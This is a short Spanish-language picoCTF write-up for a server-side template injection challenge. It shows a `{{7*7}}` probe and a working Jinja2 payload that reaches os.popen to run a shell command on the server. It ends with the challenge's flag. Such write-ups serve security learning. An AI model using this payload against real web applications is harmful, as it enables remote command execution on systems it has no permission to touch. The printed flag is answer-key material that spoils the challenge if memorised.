#### Descripción

I made a cool website where you can announce whatever you want! Try it out!
###### Pistas
- Server Side Template Injection

#### Solución 
Para este reto como bien nos dice el nombre y la pista tenemos que hacer una inyeccion de un template del lado del servidor, esto podemos comprobarlo mandando una operacion como ejemplo `{{7*7}}` en donde si nos regresa el resultado podemos ver la vulnerabilidad, entonces usando un pequeño comandito secreto de la dea: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}`, podemos sacar la flag.

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}
```

